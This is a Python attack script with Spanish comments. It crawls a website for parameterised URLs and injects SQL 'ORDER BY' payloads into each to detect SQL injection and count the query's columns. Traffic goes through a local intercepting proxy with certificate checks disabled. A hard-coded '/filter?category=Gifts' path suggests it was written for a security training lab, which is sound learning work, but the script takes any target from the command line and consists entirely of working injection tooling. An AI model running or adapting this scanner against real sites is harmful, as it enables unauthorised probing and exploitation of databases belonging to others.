import requests
import sys
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time
import random

proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}

# Función para realizar la solicitud con reintentos
def get_response(url, retries=3):
    for i in range(retries):
        try:
            r = requests.get(url, verify=False, proxies=proxies)
            if r.status_code == 200:
                return r
        except requests.RequestException as e:
            print(f"[!] Error fetching {url}: {e}. Retrying ({i+1}/{retries})...")
            time.sleep(random.uniform(1, 3))  # Espera aleatoria entre reintentos
    print(f"[-] Failed to retrieve {url} after {retries} retries.")
    return None

# Crawler para encontrar rutas que acepten parámetros (GET)
def find_urls_to_test(url, base_url):
    response = get_response(url)
    if not response:
        return set()

    soup = BeautifulSoup(response.text, 'html.parser')

    # Asegúrate de que la base_url no termine con un '/'
    base_url = base_url.rstrip('/')

    # Encuentra todos los enlaces en la página
    links = set()
    for a_tag in soup.find_all('a', href=True):
        href = a_tag['href']
        if "Id" not in href:
            full_url = href if href.startswith('http') else base_url + href
            links.add(full_url)
            if "?" in href:  # Solo interesan URLs con parámetros
               full_url = href if href.startswith('http') else base_url + href
               links.add(full_url)
            elif href.startswith('/'):  # Enlaces relativos, pueden tener parámetros ocultos
               full_url = base_url + href
               links.add(full_url)

    # Si no encontró enlaces, intenta buscar enlaces ocultos en el código fuente
    if not links:
        print("[!] No parameterized URLs found, searching deeper in the page source...")
        scripts = soup.find_all('script')
        for script in scripts:
            if "?" in script.text:
                print("[+] Found a possible URL in script content.")
                links.add(script.text)

    if not links:
        print("[-] No URLs with parameters found.")
    else:
        print(f"[+] Found {len(links)} URLs with parameters.")
    
    return links

# Prueba la inyección SQL buscando "Internal Server Error" u otros indicadores
def exploit_sqli_column_number(url):
    for i in range(1, 50):
        sql_payload = "'+order+by+%s--" % i
        r = requests.get(url + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res or "SQL" in res:
            return i - 1
    return False

if __name__ == "__main__":
    try:
        base_url = sys.argv[1].strip()
        # Asegúrate de que la base_url no termine con '/'
        base_url = base_url.rstrip('/')
    except IndexError:
        print("[-] Usage: %s <base_url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Crawling the website to find URLs with parameters...")
    urls_to_test = find_urls_to_test(base_url, base_url)

    # Agregar la ruta adicional a las URLs a probar
    additional_path = "/filter?category=Gifts"
    full_url_with_additional_path = base_url + additional_path
    urls_to_test.add(full_url_with_additional_path)

    if urls_to_test:
        print("[+] Found the following URLs with parameters:")
        for url in urls_to_test:
            print(url)

        print("\n[+] Testing each URL for SQL Injection vulnerabilities...")

        for test_url in urls_to_test:
            print(f"[+] Testing URL: {test_url}")
            num_col = exploit_sqli_column_number(test_url)
            if num_col:
                print(f"[+] Vulnerable URL found: {test_url}")
                print(f"[+] The number of columns is {num_col}.")
            else:
                print(f"[-] URL not vulnerable: {test_url}")
    else:
        print("[-] No URLs with parameters found.")

